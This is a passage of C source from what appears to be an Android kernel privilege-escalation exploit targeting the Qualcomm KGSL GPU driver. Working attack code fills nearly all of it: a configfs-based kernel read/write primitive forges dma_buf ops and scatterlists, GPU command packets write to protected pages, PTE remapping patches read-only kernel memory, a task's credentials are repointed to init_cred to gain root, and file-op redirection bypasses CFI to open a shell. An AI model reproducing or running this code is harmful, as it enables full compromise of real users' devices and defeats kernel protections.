                    if (sp && *sp) {
                      uint64_t tp = strtoull(sp, NULL, 0), msr = 0;
                      configfs_read_once(fd, data_addr(MEMSTART_ADDR), &msr, 8);
                      if (!msr) msr = 0x80000000ULL;
                      pfn = (tp - msr) >> 12;
                      pr_info("kgsl_drm: SGT_PHYS=%016zx ms=%016zx pfn=%08zx\n",
                              (size_t)tp, (size_t)msr, (size_t)pfn);
                    } else {
                      pfn = ((uint64_t)A - (uint64_t)P0_PAGE_OFFSET) >> 12;
                    }
                    uint64_t page = vs + pfn * 0x40;
                    uint64_t pl = page | 2;                          /* |SG_END */
                    uint32_t ofs = 0, len = 0x1000; uint64_t da = 0; uint32_t dl = 0;
                    configfs_write_once(fd, SL + 0x00, &pl, 8);
                    configfs_write_once(fd, SL + 0x08, &ofs, 4);
                    configfs_write_once(fd, SL + 0x0c, &len, 4);
                    configfs_write_once(fd, SL + 0x10, &da, 8);
                    configfs_write_once(fd, SL + 0x18, &dl, 4);
                    configfs_write_once(fd, A + 0x98, &FB, 8);    /* dma_buf.priv? */
                    configfs_write_once(fd, A + 0xa0, &FB, 8);    /* dma_buf.priv? */
                    uint64_t ia = (uint64_t)data_addr(ION_DMA_BUF_ATTACH);
                    uint64_t im = (uint64_t)data_addr(ION_MAP_DMA_BUF);
                    uint64_t id = (uint64_t)data_addr(ION_DMA_BUF_DETACH);
                    uint64_t iu = (uint64_t)data_addr(ION_UNMAP_DMA_BUF);
                    configfs_write_once(fd, ot + 0x00, &ia, 8);   /* attach */
                    configfs_write_once(fd, ot + 0x08, &id, 8);   /* detach */
                    configfs_write_once(fd, ot + 0x10, &im, 8);   /* map_dma_buf */
                    configfs_write_once(fd, ot + 0x18, &iu, 8);   /* unmap_dma_buf */
                    pr_info("kgsl_drm: SGT page=%016zx page_link=%016zx attach=%016zx map=%016zx\n",
                            (size_t)page, (size_t)pl, (size_t)ia, (size_t)im);
                  } else {
                    uint64_t mapf = (uint64_t)data_addr(DRM_GEM_MAP_DMA_BUF);
                    configfs_write_once(fd, ot + 0x10, &mapf, 8);
                    pr_info("kgsl_drm: fake ops.map_dma_buf=%016zx\n", (size_t)mapf);
                  }
                  configfs_write_once(fd, A + 32, &ot, 8);
                  uint64_t q[8] = {0};
                  configfs_read_once(fd, A, q, sizeof(q));
                  pr_info("kgsl_drm: patched [%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx]\n",
                          (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3],
                          (size_t)q[4], (size_t)q[5], (size_t)q[6], (size_t)q[7]);
                }
                fsync(1);
                /* PRIME-export the dumb buffer to a real dma_buf; read its ops */
                struct drm_prime_handle ph; memset(&ph, 0, sizeof ph); ph.handle = cd.handle;
                int rp = ioctl(dfd, DRM_IOCTL_PRIME_HANDLE_TO_FD_, &ph);
                pr_info("kgsl_drm: prime_h2fd=%d fd=%d errno=%d\n", rp, ph.fd, errno);
                if (rp == 0 && ph.fd >= 0 && is_direct_ptr(task)) {
                  uint64_t P2 = 0, fdt2 = 0, fdarr2 = 0, file2 = 0, dbuf = 0, dbops = 0, mapfn = 0;
                  configfs_read_once(fd, task + 0x880, &P2, sizeof(P2));
                  if (is_direct_ptr(P2)) configfs_read_once(fd, P2 + 0x20, &fdt2, sizeof(fdt2));
                  if (is_direct_ptr(fdt2)) configfs_read_once(fd, fdt2 + 0x8, &fdarr2, sizeof(fdarr2));
                  if (is_direct_ptr(fdarr2)) configfs_read_once(fd, fdarr2 + (uint64_t)ph.fd * 8, &file2, sizeof(file2));
                  if (is_direct_ptr(file2)) configfs_read_once(fd, file2 + 0xd0, &dbuf, sizeof(dbuf));
                  if (is_direct_ptr(dbuf)) {
                    configfs_read_once(fd, dbuf + 0x20, &dbops, sizeof(dbops));
                    if (is_direct_ptr(dbops)) configfs_read_once(fd, dbops + 0x10, &mapfn, sizeof(mapfn));
                  }
                  pr_info("kgsl_drm: dma_buf=%016zx ops=%016zx map_dma_buf=%016zx\n",
                          (size_t)dbuf, (size_t)dbops, (size_t)mapfn);
                  uint64_t dq[8] = {0}, oq[8] = {0};
                  if (is_direct_ptr(dbuf)) configfs_read_once(fd, dbuf, dq, sizeof(dq));
                  if (is_direct_ptr(dbops)) configfs_read_once(fd, dbops, oq, sizeof(oq));
                  pr_info("kgsl_drm: dbuf q=%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx\n",
                          (size_t)dq[0], (size_t)dq[1], (size_t)dq[2], (size_t)dq[3],
                          (size_t)dq[4], (size_t)dq[5], (size_t)dq[6], (size_t)dq[7]);
                  pr_info("kgsl_drm: ops q=%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx\n",
                          (size_t)oq[0], (size_t)oq[1], (size_t)oq[2], (size_t)oq[3],
                          (size_t)oq[4], (size_t)oq[5], (size_t)oq[6], (size_t)oq[7]);
                }
                fsync(1);

                const char *fire = getenv("KGSL_FIRE");
                if (fire && *fire) {
                  int gfd = open("/dev/kgsl-3d0", O_RDWR);
                  struct kgsl_map_user_mem m;
                  memset(&m, 0, sizeof m);
                  m.fd = dfd; m.len = cd.size; m.hostptr = (unsigned long)p; m.memtype = 2;
                  pr_info("kgsl_drm: firing KGSL ioctl gfd=%d hostptr=%p ...\n", gfd, p);
                  fsync(1);
                  int rr = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m);
                  pr_info("kgsl_drm: ioctl ret=%d gpuaddr=%016zx errno=%d\n",
                          rr, (size_t)m.gpuaddr, errno);
                  fsync(1);
                  /* KGW=1: submit a CP_MEM_WRITE through the GPU to the target page
                   * that was just mapped (m.gpuaddr).  Needs a second mapping for
                   * the IB: point the forged scatterlist at one of our own anon
                   * pages, whose phys we find with the dirty-PTE walk. */
                  const char *kgw = getenv("KGW");
                  if (rr == 0 && kgw && *kgw && gSL) {
                    uint64_t msv = 0, mmv = 0, pgdv = 0;
                    configfs_read_once(fd, data_addr(MEMSTART_ADDR), &msv, 8);
                    if (!msv) msv = 0x80000000ULL;
                    configfs_read_once(fd, task + 0x5f8, &mmv, 8);
                    if (is_direct_ptr(mmv)) configfs_read_once(fd, mmv + 0x48, &pgdv, 8);
                    uint32_t *ib = (uint32_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                    if (ib != MAP_FAILED) ib[0] = 0;   /* fault the page in */
                    uintptr_t sslot = 0; uint64_t ibpte = 0;
                    int ok = (ib != MAP_FAILED) && is_direct_ptr(pgdv) &&
                             gl_pte_walk2(fd, pgdv, (uintptr_t)ib, 3, msv, &sslot, &ibpte);
                    if (!ok) {
                      pr_info("kgw: cannot locate IB page phys (mm=%016zx pgd=%016zx stage=%d)\n",
                              (size_t)mmv, (size_t)pgdv, gl_pt_stage); fsync(1);
                    } else {
                      uint64_t ib_phys = (uint64_t)(ibpte & PTE_OA_MASK) & ~0xfffULL;
                      const char *vv = getenv("KGW_VAL");
                      uint32_t val = (uint32_t)strtoul(vv && *vv ? vv : "0x41", NULL, 0);
                      const char *se = getenv("KGW_SELF");
                      int self = (se && *se) ? 1 : 0;
                      pr_info("kgw: ib_phys=%016zx gpu_tgt=%016zx self=%d\n",
                              (size_t)ib_phys, (size_t)m.gpuaddr, self);
                      fsync(1);
                      /* second fire: forged scatterlist -> our IB page */
                      uint64_t ibpage = (uint64_t)VMEMMAP_START +
                                        ((ib_phys - msv) >> 12) * 0x40;
                      uint64_t ibpl = ibpage | 2;
                      configfs_write_once(fd, gSL + 0x00, &ibpl, 8);
                      struct kgsl_map_user_mem m2; memset(&m2, 0, sizeof m2);
                      m2.fd = dfd; m2.len = cd.size;
                      m2.hostptr = (unsigned long)p; m2.memtype = 2;
                      int r2 = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m2);
                      pr_info("kgw: ib map ret=%d gpuaddr=%016zx errno=%d\n",
                              r2, (size_t)m2.gpuaddr, errno); fsync(1);
                      if (r2 == 0 && m2.gpuaddr) {
                        /* build the PM4 now: gpuaddr of the IB is known only here.
                         * Target = the protected page, or (self test) 0x20 bytes
                         * into this very IB page, which we can read from the CPU. */
                        uint64_t writetgt = self ? (uint64_t)(m2.gpuaddr + 0x20)
                                                 : (uint64_t)m.gpuaddr;
                        ib[0] = cp_type7_packet(CP_MEM_WRITE, 3);
                        ib[1] = (uint32_t)writetgt;
                        ib[2] = (uint32_t)(writetgt >> 32);
                        ib[3] = val;
                        pr_info("kgw: pm4=%08x %08x %08x %08x -> %016zx\n",
                                ib[0], ib[1], ib[2], ib[3], (size_t)writetgt); fsync(1);
                        struct kgsl_drawctxt_create dc; memset(&dc, 0, sizeof dc);
                        dc.flags = 0x12;  /* KGSL_CONTEXT_PREAMBLE|NO_GMEM_ALLOC */
                        int rd = ioctl(gfd, IOCTL_KGSL_DRAWCTXT_CREATE_, &dc);
                        pr_info("kgw: drawctxt ret=%d ctx=%08x errno=%d\n",
                                rd, dc.drawctxt_id, errno); fsync(1);
                        if (rd == 0) {
                          /* ultra-legacy path: ibdesc_addr = IB gpuaddr,
                           * numibs = size in DWORDs */
                          struct kgsl_ringbuffer_issueibcmds ic; memset(&ic, 0, sizeof ic);
                          ic.drawctxt_id = dc.drawctxt_id;
                          ic.ibdesc_addr = (unsigned long)m2.gpuaddr;
                          ic.numibs = 4;         /* 4 dwords = 16 bytes */
                          ic.flags = 0;
                          int ri = ioctl(gfd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_, &ic);
                          pr_info("kgw: submit ret=%d ts=%u errno=%d\n",
                                  ri, ic.timestamp, errno); fsync(1);
                          if (ri == 0) usleep(500000);   /* let the CP run */
                          if (self) {
                            pr_info("kgw: SELFTEST ib[8]=%08x want=%08x\n",
                                    ib[8], val); fsync(1);
                          } else {
                          /* read the target page back in-process via a dirty PTE */
                          const char *sp2 = getenv("KGSL_SGT_PHYS");
                          uint64_t tphys = sp2 ? strtoull(sp2, NULL, 0) : 0;
                          uint32_t *rb = (uint32_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                          if (rb != MAP_FAILED && tphys) {
                            rb[0] = 0;
                            uintptr_t rs = 0; uint64_t rpte = 0;
                            if (gl_pte_walk2(fd, pgdv, (uintptr_t)rb, 3, msv, &rs, &rpte)) {
                              uint64_t npte = (ibpte & ~PTE_OA_MASK) |
                                              ((tphys & ~0xfffULL) & PTE_OA_MASK);
                              mprotect(rb, 0x1000, PROT_NONE);
                              configfs_write_once(fd, rs, &npte, 8);
                              pr_info("kgw: READBACK tgt[0..3] = %08x %08x %08x %08x\n",
                                      rb[0], rb[1], rb[2], rb[3]);
                              fsync(1);
                              configfs_write_once(fd, rs, &rpte, 8);  /* restore */
                            }
                          }
                          }
                        }
                      }
                    }
                  }
                  /* Run KGSL's mem-entry teardown NOW, while the forged ops is
                   * still in place (kgsl_release -> kgsl_mem_entry_destroy ->
                   * kgsl_destroy_ion -> dma_buf_unmap_attachment).  Otherwise the
                   * deferred teardown at do_exit() dispatches through the
                   * restored object and CFI-faults. */
                  if (gfd >= 0) { close(gfd); pr_info("kgsl_drm: closed kgsl fd (teardown ran)\n"); fsync(1); }
                }
                /* restore the victim object so closing the fd doesn't crash */
                if (A_saved) {
                  for (int k = 0; k < 64; k++)
                    configfs_write_once(fd, A_saved + k * 8, &qorig[k], 8);
                  pr_info("kgsl_drm: restored victim\n"); fsync(1);
                }
              }
            }
          }
        }
      }

      /* PTEMAP=1: dirty-PTE primitive.  Remap a chosen physical page (or a
       * kernel-in-image VA, given kimage_voffset) into userspace using our own
       * arbitrary kernel R/W, so we can read/write pages the kernel maps RO
       * (.text/.rodata) -> runtime ROM patching.  Discovery is verified by
       * reading the linear-map alias of our own page (no speculative writes). */
      {
        const char *pme = getenv("PTEMAP");
        if (pme && *pme) {
          uint32_t me = (uint32_t)getpid();
          uintptr_t head = data_addr(INIT_TASK_TASKS);
          uintptr_t canon = canon_addr(INIT_TASK_TASKS);
          uint64_t entry = 0; uintptr_t task = 0;
          configfs_read_once(fd, head, &entry, sizeof entry);
          for (int i = 0; i < 8192; i++) {
            if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
            if (!is_direct_ptr(entry)) break;
            uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
            uint32_t pid = 0;
            configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof pid);
            if (pid == me) { task = t; break; }
            if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof entry)
                != (ssize_t)sizeof entry) break;
          }
          uint64_t ms = 0, kv = 0;
          configfs_read_once(fd, data_addr(MEMSTART_ADDR), &ms, 8);
          configfs_read_once(fd, data_addr(KIMAGE_VOFFSET), &kv, 8);
          uintptr_t va1 = (uintptr_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
          uintptr_t va2 = (uintptr_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
          *(volatile uint64_t *)va1 = 0x1122334455667788ULL;   /* fault va1 in */
          *(volatile uint64_t *)va2 = 0x99aabbccddeeff00ULL;   /* fault va2 in */
          pr_info("ptemap: task=%016zx ms=%016zx kvoff=%016zx va1=%016zx va2=%016zx\n",
                  (size_t)task, (size_t)ms, (size_t)kv, (size_t)va1, (size_t)va2);
          fsync(1);
          uintptr_t found_pgd = 0; uint32_t f_mm = 0, f_po = 0; uint64_t f_ms = 0; int f_lv = 3;
          uintptr_t f_mmp = 0;
          int n_mm = 0, n_pgd = 0, n_walk = 0; uint64_t first_oa = 0;
          int st_hist[8] = {0};
          uintptr_t dbg_pgd = 0; uint64_t dbg_d1 = 0;
          if (is_direct_ptr(task)) {
            static const uint64_t mscand[] = {0x80000000ULL, 0x40000000ULL,
                                              0xC0000000ULL, 0x0ULL, 0x100000000ULL};
            for (uintptr_t off = 0x200; off < 0x1200 && !found_pgd; off += 8) {
              uint64_t mm = 0;
              configfs_read_once(fd, task + off, &mm, 8);
              if (!is_direct_ptr((uintptr_t)mm)) continue;
              n_mm++;
              for (uintptr_t poff = 0x08; poff <= 0x120 && !found_pgd; poff += 8) {
                uint64_t pgd = 0;
                configfs_read_once(fd, (uintptr_t)mm + poff, &pgd, 8);
                if (!is_direct_ptr((uintptr_t)pgd) || (pgd & 0xfff)) continue;
                n_pgd++;
                for (int lv = 3; lv <= 4 && !found_pgd; lv++) {
                  uintptr_t s1 = 0; uint64_t p1 = 0;
                  if (!gl_pte_walk2(fd, pgd, va1, lv, ms, &s1, &p1)) {
                    st_hist[gl_pt_stage]++;
                    if (!dbg_pgd) {
                      dbg_pgd = (uintptr_t)pgd;
                      size_t di = (va1 >> ((lv == 4) ? 39 : 30)) & 0x1ff;
                      configfs_read_once(fd, (uintptr_t)pgd + di * 8, &dbg_d1, 8);
                    }
                    continue;
                  }
                  if ((p1 & 3) != 3) continue;
                  n_walk++;
                  uint64_t oa1 = p1 & PTE_OA_MASK;
                  if (!oa1) continue;
                  if (!first_oa) first_oa = p1;
                  for (size_t ci = 0; ci < sizeof(mscand) / sizeof(mscand[0]); ci++) {
                    uintptr_t ka = (uintptr_t)(oa1 - mscand[ci]) + (uintptr_t)P0_PAGE_OFFSET;
                    if (!is_direct_ptr(ka)) continue;
                    uint64_t probe = 0;
                    if (configfs_read_once(fd, ka, &probe, 8) != (ssize_t)8) continue;
                    if (probe == 0x1122334455667788ULL) {
                      found_pgd = (uintptr_t)pgd; f_mm = (uint32_t)off;
                      f_po = (uint32_t)poff; f_ms = mscand[ci]; f_lv = lv;
                      f_mmp = (uintptr_t)mm;
                      break;
                    }
                  }
                }
              }
            }
          }
          if (!found_pgd) {
            pr_info("ptemap: mm/pgd NOT found (n_mm=%d n_pgd=%d n_walk=%d first_pte=%016zx)\n",
                    n_mm, n_pgd, n_walk, (size_t)first_oa);
            pr_info("ptemap: stage hist 1..7 = %d %d %d %d %d %d %d; dbg pgd=%016zx d1=%016zx\n",
                    st_hist[1], st_hist[2], st_hist[3], st_hist[4], st_hist[5],
                    st_hist[6], st_hist[7], (size_t)dbg_pgd, (size_t)dbg_d1);
            fsync(1);
          } else {
            pr_info("ptemap: FOUND mm_off=%03x pgd_off=%02x mm=%016zx pgd=%016zx ms=%016zx lv=%d\n",
                    f_mm, f_po, (size_t)f_mmp, (size_t)found_pgd, (size_t)f_ms, f_lv);
            fsync(1);
            /* Target: "banner" -> linux_banner (.rodata); otherwise numeric
             * (kernel-image VA if >= 0xffffff8000000000, else a raw physical). */
            uint64_t target_va = 0, arg = strtoull(pme, NULL, 0);
            if (pme[0] == 'b') target_va = (uint64_t)data_addr(LINUX_BANNER);
            else if (arg >= 0xffffff8000000000ULL) target_va = arg;
            uint64_t phys = target_va ? (target_va - kv) : arg;
            size_t off = target_va ? (size_t)(target_va & 0xfff) : 0;
            phys &= ~0xfffULL;
            uintptr_t s2 = 0; uint64_t p2 = 0;
            if (phys && gl_pte_walk2(fd, found_pgd, va2, f_lv, ms, &s2, &p2)) {
              uint64_t pte = (p2 & ~PTE_OA_MASK) | (phys & PTE_OA_MASK);
              mprotect((void *)va2, 0x1000, PROT_NONE);   /* flush TLB for va2 */
              configfs_write_once(fd, s2, &pte, 8);
              pr_info("ptemap: va=%016zx phys=%016zx pte=%016zx off=%zx\n",
                      (size_t)target_va, (size_t)phys, (size_t)pte, off);
              fsync(1);
              uint8_t b[32];
              for (int i = 0; i < 32; i++) b[i] = ((volatile uint8_t *)va2)[off + i];
              pr_info("ptemap: read =");
              for (int i = 0; i < 32; i++) pr_info(" %02x", b[i]);
              pr_info("  |");
              for (int i = 0; i < 32; i++)
                pr_info("%c", (b[i] >= 0x20 && b[i] < 0x7f) ? b[i] : '.');
              pr_info("|\n");
              fsync(1);
              const char *pw = getenv("PTEWRITE");
              if (pw && *pw) {
                volatile uint8_t *p = (volatile uint8_t *)va2 + off;
                uint8_t nv = (uint8_t)strtoul(pw, NULL, 0), ov = *p;
                *p = nv;
                uint8_t rb = *p, kb = 0;
                uint64_t la = (phys + off) - ms + (uint64_t)P0_PAGE_OFFSET;
                configfs_read_once(fd, (uintptr_t)la, &kb, 1);
                pr_info("ptemap: WRITE off=%zx %02x->%02x readback=%02x kernalias=%02x\n",
                        off, ov, nv, rb, kb);
                fsync(1);
              }
              /* CRITICAL: restore va2's original PTE.  Leaving a crafted PTE in
               * place makes zap_pte_range() at process exit put_page() a page we
               * do not own -> refcount corruption / hard hang (not a panic). */
              configfs_write_once(fd, s2, &p2, 8);
              pr_info("ptemap: PTE restored\n");
              fsync(1);
            }
          }
        }
      }

      /* Optional: repoint a target task's cred -> canonical init_cred. */
      const char *ct = getenv("CRED_TGID");
      if (ct && *ct) {
        uint32_t tg = (uint32_t)strtoul(ct, NULL, 0);
        repoint_task_cred(fd, tg, canon_addr(INIT_CRED));
      }
    }
  }

  if (env_flag("GL_SHELL", 0)) {
    pr_success("cfi: gl shell live (gadget installed); watch /data/local/tmp/gl.out\n");
    gl_shell_run(fd);
    pr_success("cfi: gl shell exited\n");
  }

  if (env_flag("CFI_STOP_VERIFY", 0)) {
    /* Redirect verified: the fake fops are installed and working.  Restore the
     * original fops (so /dev/ashmem is not left dangling when we exit) and stop
     * before the physrw stage (whose PIPE_* offsets are still 5.x; task B). */
    uint64_t orig = canon_addr(ASHMEM_FOPS);
    ssize_t rr = configfs_write_once(fd, misc_fops, &orig, sizeof(orig));
    cfi_restore_ret = rr;
    pr_success("cfi STOP_VERIFY: fops_before=%016llx == fake_fops; restored "
               "orig=%016llx ret=%zd; stopping before physrw errno=%d\n",
               (unsigned long long)before, (unsigned long long)orig, rr, errno);
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    SYSCHK(close(fd));
    return 1;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  pr_info("cfi FAIL step=%d errno=%d (kaslr_step=%d)\n", cfi_last_step,
          cfi_last_errno, kaslr_step);
  fsync(1);
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
